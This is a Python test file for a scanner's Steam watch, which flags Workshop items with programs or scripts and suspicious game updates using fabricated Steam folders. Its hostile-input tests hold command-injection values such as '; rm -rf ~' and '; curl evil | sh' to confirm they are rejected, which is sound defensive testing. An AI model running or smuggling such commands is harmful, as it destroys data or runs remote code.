"""The Steam watch (steamwatch.py): Workshop items carrying code, and game
updates worth a look.

Checked here:

  * the first sight of a game is only recorded: nothing to compare with yet;
  * an update is listed for the signals chosen (a small update adding code,
    a small update changing a program, an update adding scripts), and not
    for the noisy one (a big update changing programs); a renamed game is
    listed; an encrypted manifest's update isn't guessed at;
  * a Workshop item with programs, scripts or a password-protected zip is
    listed, one with only Lua or data isn't, and a symlinked item is skipped;
  * an acknowledged finding isn't listed again, until what it's about
    changes; an uninstalled game's records go;
  * broken Steam files never crash it;
  * protected mode: a decisions file made before this table existed is read
    as empty and can't be written, and the next sudo run adds the table.

Runs anywhere: the Steam folders are built here.

    python3 tests/steamwatch_test.py
"""
from __future__ import annotations

import sys as _sys_path
from pathlib import Path as _Path

ROOT = _Path(__file__).resolve().parent.parent
_sys_path.path.insert(0, str(ROOT))

import hashlib  # noqa: E402
import io  # noqa: E402
import sqlite3  # noqa: E402
import struct  # noqa: E402
import tempfile  # noqa: E402
import zipfile  # noqa: E402
from pathlib import Path  # noqa: E402

from sqlalchemy import create_engine  # noqa: E402
from sqlalchemy.exc import OperationalError  # noqa: E402
from sqlalchemy.orm import Session  # noqa: E402

from ensign_scan import steamwatch  # noqa: E402
from ensign_scan.db import make_engine, upgrade_decision_tables  # noqa: E402
from ensign_scan.models import Base, FileRecord, SteamAcknowledged, SteamPending, SteamSnapshot  # noqa: E402


def _varint(n: int) -> bytes:
    out = b""
    while True:
        b, n = n & 0x7F, n >> 7
        out += bytes([b | (0x80 if n else 0)])
        if not n:
            return out


def _field(number: int, value) -> bytes:
    if isinstance(value, int):
        return _varint(number << 3) + _varint(value)
    return _varint(number << 3 | 2) + _varint(len(value)) + value


def manifest(depot: int, files: dict[str, bytes], encrypted: bool = False) -> bytes:
    payload = b""
    for rel, content in files.items():
        name = rel.replace("/", "\\")
        payload += _field(1, _field(1, b"enc" + hashlib.sha1(name.encode()).digest() if encrypted
                                    else name.encode())
                          + _field(3, 0) + _field(4, hashlib.sha1(name.lower().encode()).digest())
                          + _field(5, hashlib.sha1(content).digest()))
    meta = _field(1, depot) + _field(4, int(encrypted))
    raw = (struct.pack("<II", 0x71F617D0, len(payload)) + payload + struct.pack("<II", 0x1F4812BE, len(meta))
           + meta + struct.pack("<I", 0x32C415AB))
    zipped = io.BytesIO()
    with zipfile.ZipFile(zipped, "w") as zf:
        zf.writestr("z", raw)
    return zipped.getvalue()


def acf(appid: str, name: str, depots: dict[str, str]) -> str:
    installed = "".join(f'  "{d}"\n  {{\n   "manifest" "{m}"\n  }}\n' for d, m in depots.items())
    return (f'"AppState"\n{{\n "appid" "{appid}"\n "name" "{name}"\n "installdir" "{name}"\n'
            f' "InstalledDepots"\n {{\n{installed} }}\n}}\n')


def password_zip(path: Path) -> None:
    """A zip whose entry says it's encrypted (the flag readers check)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("inner.txt", "secret")
    data = bytearray(buf.getvalue())
    for sig, offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        at = data.find(sig)
        data[at + offset] |= 1
    path.write_bytes(bytes(data))


def scanned(engine, folder: Path) -> None:
    """Record every file under folder the way a scan does: walking without
    following links to folders, each file with its SHA-256."""
    import os  # noqa: E402
    with Session(engine) as session:
        have = {p for (p,) in session.query(FileRecord.filepath)}
        for dirpath, _dirs, names in os.walk(folder):
            for n in names:
                path = Path(dirpath, n)
                if str(path) in have or not path.is_file():
                    continue
                session.add(FileRecord(filepath=str(path), filename=n,
                                       file_hash=hashlib.sha256(path.read_bytes()).hexdigest()))
        for row in session.query(FileRecord).filter(FileRecord.filepath.in_([str(p) for p in have])):
            if Path(row.filepath).is_file():
                row.file_hash = hashlib.sha256(Path(row.filepath).read_bytes()).hexdigest()
        session.commit()


def flat(lines) -> str:
    """Lines as one string, whitespace folded: what they say, not their layout."""
    return " ".join(" ".join(lines).split())


def keys(engine, kind=None) -> list[str]:
    return sorted(f.key for f in steamwatch.open_findings(engine) if kind is None or f.kind == kind)


# --- the comparison, on its own -----------------------------------------------------------------
def snap(files: dict[str, bytes]):
    return steamwatch._snapshot(manifest(1, files))


base = {f"data/{i}.pak": bytes([i]) for i in range(20)} | {"Game.exe": b"v1", "engine.dll": b"e1"}
old_files, old_code, _ = snap(base)
cases = {
    "small, adds a script": ({**base, "run.bat": b"x"}, "adds code: run.bat"),
    "small, adds a program": ({**base, "helper.exe": b"x"}, "adds code: helper.exe"),
    "small, changes a program": ({**base, "engine.dll": b"e2"}, "changes a program: engine.dll"),
    "big, adds a script": ({**base, **{f"data/{i}.pak": b"new" + bytes([i]) for i in range(10)},
                            "tools/setup.ps1": b"x"}, "The update adds scripts: tools/setup.ps1"),
    "big, changes programs (noise)": ({**base, **{f"data/{i}.pak": b"n" + bytes([i]) for i in range(10)},
                                       "Game.exe": b"v2", "engine.dll": b"e2"}, None),
    "small, data only": ({**base, "data/0.pak": b"patched"}, None),
}
for name, (files, expected) in cases.items():
    new_files, new_code, enc = snap(files)
    reasons = steamwatch.compare(old_files, old_code, new_files, new_code, enc)
    if expected is None:
        assert reasons == [], (name, reasons)
    else:
        assert len(reasons) == 1 and expected in flat(reasons[0]), (name, reasons)
enc_files, enc_code, enc = steamwatch._snapshot(manifest(1, {**base, "run.bat": b"x"}, encrypted=True))
assert enc and enc_code == {} and steamwatch.compare(old_files, old_code, enc_files, enc_code, enc) == [], \
    "no names, no guess"
assert steamwatch.valid_key("update-10-11-333") and steamwatch.valid_key("rename-10-abcdef012345")
assert not steamwatch.valid_key("update-10-11-333; rm -rf ~") and not steamwatch.valid_key("x")
print("update comparison test passed ✓")


# --- a Steam install, watched over several runs -------------------------------------------------
with tempfile.TemporaryDirectory() as d:
    home = Path(d, "home")
    steam_root = home / ".local/share/Steam"
    apps, cache = steam_root / "steamapps", steam_root / "depotcache"
    apps.mkdir(parents=True)
    cache.mkdir()
    game_files = {**base}

    def install(name="Rodent Race", manifest_id="111", files=None, encrypted=False):
        (apps / "appmanifest_10.acf").write_text(acf("10", name, {"11": manifest_id}))
        (cache / f"11_{manifest_id}.manifest").write_bytes(manifest(11, files or game_files, encrypted))

    workshop = apps / "workshop" / "content" / "10"
    for item, content in {"501": {"wallpaper.exe": b"x"}, "502": {"scene.json": b"{}"},
                          "503": {"mod.lua": b"x"}, "505": {"tools/run.ps1": b"x"}}.items():
        for rel, data in content.items():
            (workshop / item / rel).parent.mkdir(parents=True, exist_ok=True)
            (workshop / item / rel).write_bytes(data)
    (workshop / "504").mkdir()
    (apps / "workshop" / "appworkshop_10.acf").write_text(
        '"AppWorkshop" { "WorkshopItemsInstalled" { "501" { "timeupdated" "1764000000" } } }')
    password_zip(workshop / "504" / "pack.zip")
    elsewhere = Path(d, "elsewhere")
    elsewhere.mkdir()
    (elsewhere / "evil.exe").write_bytes(b"x")
    (workshop / "506").symlink_to(elsewhere)   # a link: the scan doesn't follow it, and neither does this
    (workshop / "507").mkdir()
    (workshop / "507" / "new.exe").write_bytes(b"x")   # added after the scan: not checked, but counted

    engine = make_engine(f"sqlite:///{d}/system.db")
    install()
    for item in ("501", "502", "503", "504", "505"):
        scanned(engine, workshop / item)
    uncovered = steamwatch.watch(engine, home)
    assert uncovered == {str(steam_root.resolve()): 1}, uncovered
    with Session(engine) as session:
        assert session.query(SteamSnapshot).count() == 1, "first sight: recorded"
    assert keys(engine, "update") == [] and keys(engine, "rename") == [], "nothing to compare with yet"
    listed = keys(engine, "workshop")
    assert [k.split("-")[2] for k in listed] == ["501", "504", "505"], listed
    details = {f.key.split("-")[2]: flat(f.detail) for f in steamwatch.open_findings(engine)}
    assert "Programs: wallpaper.exe." in details["501"] and "Password-protected archives: pack.zip." in details["504"]
    assert "filedetails/?id=501" in details["501"] and str(workshop / "501") in details["501"], details
    assert "Workshop item 501 (updated 2025-11-24)" in details["501"] and "(updated" not in details["505"], details
    # More names than are shown: the list ends with how many more.
    lines = steamwatch._listed("Programs:", [f"{i}.exe" for i in range(8)])
    assert lines[0] == "Programs:" and lines[1] == "    0.exe," and lines[5] == "    4.exe," \
        and lines[-1] == "    and 3 more.", lines

    # A run with nothing new changes nothing.
    steamwatch.watch(engine, home)
    assert keys(engine, "update") == []

    # A small update that adds a script: listed, with what it added.
    install(manifest_id="222", files={**game_files, "run.bat": b"x"})
    steamwatch.watch(engine, home)
    assert keys(engine, "update") == ["update-10-11-222"], keys(engine)
    found = [f for f in steamwatch.open_findings(engine) if f.kind == "update"][0]
    assert "adds code: run.bat." in flat(found.detail) and found.game == "Rodent Race", found
    game_files["run.bat"] = b"x"

    # A big update that only changes programs: not listed (the noisy signal).
    big = {**game_files, **{f"data/{i}.pak": b"v3" + bytes([i]) for i in range(12)}, "Game.exe": b"v3"}
    install(manifest_id="333", files=big)
    steamwatch.watch(engine, home)
    assert keys(engine, "update") == ["update-10-11-222"], "the big update isn't listed"
    game_files = big

    # Renamed and then updated, with a changed engine DLL (the Beyond The Dark shape).
    install(name="Beyond The Dark", manifest_id="444", files={**game_files, "engine.dll": b"trojaned"})
    steamwatch.watch(engine, home)
    assert keys(engine, "update") == ["update-10-11-222", "update-10-11-444"], keys(engine)
    assert len(keys(engine, "rename")) == 1
    rename = [f for f in steamwatch.open_findings(engine) if f.kind == "rename"][0]
    assert "it was called Rodent Race" in rename.detail[0] and rename.game == "Beyond The Dark", rename
    steamwatch.watch(engine, home)
    assert len(keys(engine, "rename")) == 1, "a rename is listed once"

    # Acknowledged: not listed again, until it changes.
    all_keys = keys(engine)
    assert steamwatch.acknowledge(engine, all_keys) == len(all_keys)
    assert steamwatch.acknowledge(engine, all_keys) == 0, "twice is once"
    steamwatch.watch(engine, home)
    assert keys(engine) == [], keys(engine)
    # Touched but not changed (a re-download, a moved library): the same ID.
    os_module = __import__("os")
    os_module.utime(workshop / "501" / "wallpaper.exe", (1, 1))
    scanned(engine, workshop / "501")
    steamwatch.watch(engine, home)
    assert keys(engine) == [], "same content, same ID"
    # Changed content: a new ID, listed again.
    (workshop / "501" / "second.exe").write_bytes(b"y")
    scanned(engine, workshop / "501")
    steamwatch.watch(engine, home)
    assert [k.split("-")[2] for k in keys(engine)] == ["501"], "a changed item is listed again"
    # A record outlives its file (until purge-missing): only what's there now counts.
    (workshop / "505" / "tools" / "run.ps1").unlink()
    steamwatch.watch(engine, home)
    assert "505" not in [k.split("-")[2] for k in keys(engine, "workshop")], keys(engine)

    # An encrypted manifest's update: compared by size only, so no guesses.
    install(name="Beyond The Dark", manifest_id="555", files={**game_files, "drop.bat": b"z"}, encrypted=True)
    steamwatch.watch(engine, home)
    assert keys(engine, "update") == [], keys(engine)

    # Broken Steam files: skipped, never a crash.
    (apps / "appmanifest_20.acf").write_text('"AppState" { "appid" "20" "InstalledDepots" { "21" { "manifest" "9" ')
    (cache / "21_9.manifest").write_bytes(b"PK\x03\x04 broken")
    (apps / "appmanifest_30.acf").write_bytes(b"\xff\xfe\x00 not text")
    (cache / "11_666.manifest").write_bytes(b"\x00" * 64)
    install(name="Beyond The Dark", manifest_id="666")
    (cache / "11_666.manifest").write_bytes(struct.pack("<II", 0x71F617D0, 999) + b"short")
    steamwatch.watch(engine, home)

    # Uninstalled: its records go, and so does what was listed about it.
    for acf_file in apps.glob("appmanifest_*.acf"):
        acf_file.unlink()
    import shutil  # noqa: E402
    shutil.rmtree(apps / "workshop")
    steamwatch.watch(engine, home)
    with Session(engine) as session:
        assert session.query(SteamSnapshot).count() == 0 and session.query(SteamPending).count() == 0
        assert session.query(SteamAcknowledged).count() == len(all_keys), "acknowledgments are kept"
    engine.dispose()
    print("Steam watch test passed ✓")


# --- what anything running as you could plant -----------------------------------------------------
with tempfile.TemporaryDirectory() as d:
    home = Path(d, "home")
    root = home / ".local/share/Steam"
    apps, cache = root / "steamapps", root / "depotcache"
    apps.mkdir(parents=True)
    cache.mkdir()
    engine = make_engine(f"sqlite:///{d}/system.db")

    # An ID that isn't in Ensign's form is never listed: the list goes into a
    # command you may paste with sudo.
    with Session(engine) as session:
        session.add(SteamPending(key="update-1-2-3; curl evil | sh", kind="update", appid="1", detail="x"))
        session.add(SteamPending(key="update-1-2-3\x1b[2J", kind="update", appid="1", detail="x"))
        session.commit()
    assert keys(engine) == [], keys(engine)

    # Folder and app IDs in other scripts' digits ("١٢٣".isdigit() is True) are skipped.
    odd = apps / "workshop" / "content" / "١٢٣" / "٤٥٦"
    odd.mkdir(parents=True)
    (odd / "x.exe").write_bytes(b"x")
    (apps / "appmanifest_99.acf").write_text(acf("٩٩", "Odd", {"١": "٢"}))
    steamwatch.watch(engine, home)
    assert keys(engine) == [] and not any(not k.isascii() for k in keys(engine))
    with Session(engine) as session:
        assert session.query(SteamSnapshot).count() == 0

    # No name in the appmanifest: no "rename" when one appears.
    (apps / "appmanifest_99.acf").unlink()
    (apps / "appmanifest_40.acf").write_text(acf("40", "", {"41": "1"}).replace('"name" ""', ""))
    (cache / "41_1.manifest").write_bytes(manifest(41, {"a.exe": b"1"}))
    steamwatch.watch(engine, home)
    (apps / "appmanifest_40.acf").write_text(acf("40", "Named Later", {"41": "1"}))
    steamwatch.watch(engine, home)
    assert keys(engine, "rename") == [], keys(engine)

    # A second library on a drive that isn't mounted: what was found there is kept.
    other = Path(d, "drive")
    (other / "steamapps").mkdir(parents=True)
    (other / "depotcache").mkdir()
    (apps / "libraryfolders.vdf").write_text(f'"libraryfolders" {{ "1" {{ "path" "{other}" }} }}')
    (other / "steamapps" / "appmanifest_50.acf").write_text(acf("50", "Far Game", {"51": "1"}))
    (other / "depotcache" / "51_1.manifest").write_bytes(manifest(51, {"g.exe": b"1"}))
    steamwatch.watch(engine, home)
    (other / "steamapps" / "appmanifest_50.acf").write_text(acf("50", "Far Game", {"51": "2"}))
    (other / "depotcache" / "51_2.manifest").write_bytes(manifest(51, {"g.exe": b"1", "x.bat": b"2"}))
    steamwatch.watch(engine, home)
    assert keys(engine, "update") == ["update-50-51-2"], keys(engine)
    (other / "steamapps").rename(other / "unmounted")
    steamwatch.watch(engine, home)
    assert keys(engine, "update") == ["update-50-51-2"], "a library that isn't there says nothing"
    with Session(engine) as session:
        assert session.query(SteamSnapshot).filter(SteamSnapshot.appid == "50").count() == 1
    (other / "unmounted").rename(other / "steamapps")
    (other / "steamapps" / "appmanifest_50.acf").unlink()
    steamwatch.watch(engine, home)
    assert keys(engine, "update") == [], "the library is back, and the game is gone"

    # A big item: no cap, so code after any number of files counts.
    big = apps / "workshop" / "content" / "60" / "61"
    for i in range(300):
        (big / f"d{i:03}").mkdir(parents=True)
        (big / f"d{i:03}" / "f.txt").write_text("x")
    (big / "zz").mkdir()
    (big / "zz" / "late.exe").write_bytes(b"x")
    scanned(engine, big)
    steamwatch.watch(engine, home)
    assert any(k.startswith("workshop-60-61-") for k in keys(engine)), keys(engine)
    engine.dispose()

from ensign_scan.explanations import known_family  # noqa: E402

assert known_family("Win.Trojan.Vidar-1\nInjected") is None and known_family("\n") is None
# A Workshop finding stored by the first version of the watch (an older ID and
# layout, and no library) is replaced by the current one, not listed beside it.
with tempfile.TemporaryDirectory() as d:
    home = Path(d, "home")
    item = home / ".local/share/Steam/steamapps/workshop/content/100/2000"
    item.mkdir(parents=True)
    (item / "a.exe").write_bytes(b"x")
    engine = make_engine(f"sqlite:///{d}/system.db")
    with Session(engine) as session:
        session.add(SteamPending(key="workshop-100-2000-aaaaaaaaaaaa", kind="workshop", appid="100",
                                 game="Example Game", detail="Workshop item 2000: Programs: a.exe."))
        session.commit()
    scanned(engine, item)
    steamwatch.watch(engine, home)
    found = steamwatch.open_findings(engine)
    assert len(found) == 1 and found[0].key != "workshop-100-2000-aaaaaaaaaaaa", [f.key for f in found]
    assert found[0].detail[0] == "Workshop item 2000", found[0].detail
    engine.dispose()

print("hostile input test passed ✓")


# --- protected mode: a decisions file from before this table ------------------------------------
with tempfile.TemporaryDirectory() as d:
    decisions = Path(d, "decisions.db")
    old = create_engine(f"sqlite:///{decisions}")
    Base.metadata.create_all(old, tables=[Base.metadata.tables[t] for t in
                                          ("allowances", "allowed_folders", "persistence_entries")])
    old.dispose()
    engine = make_engine(f"sqlite:///{d}/system.db", decisions=decisions)
    assert steamwatch.open_findings(engine) == [], "read as empty"
    try:
        steamwatch.acknowledge(engine, ["update-1-2-3"])
        raise AssertionError("a protected run wrote a decision")
    except OperationalError:
        pass   # a view can't be written
    engine.dispose()
    from ensign_scan import protect  # noqa: E402
    conn = sqlite3.connect(decisions)
    assert protect.missing_columns(conn) == {}, "not a reason to stop a protected run"
    conn.close()
    # The next sudo run adds it (protect.upgrade_all -> upgrade_decision_tables).
    writer = create_engine(f"sqlite:///{decisions}")
    with writer.begin() as c:
        assert upgrade_decision_tables(c) is True
    with writer.begin() as c:
        assert upgrade_decision_tables(c) is False, "once"
    assert steamwatch.acknowledge(writer, ["update-1-2-3"]) == 1
    writer.dispose()
    engine = make_engine(f"sqlite:///{d}/system.db", decisions=decisions)
    with Session(engine) as session:
        assert [k for (k,) in session.query(SteamAcknowledged.key)] == ["update-1-2-3"]
    engine.dispose()
    print("protected decisions test passed ✓")

print("\nAll Steam watch tests passed ✓")
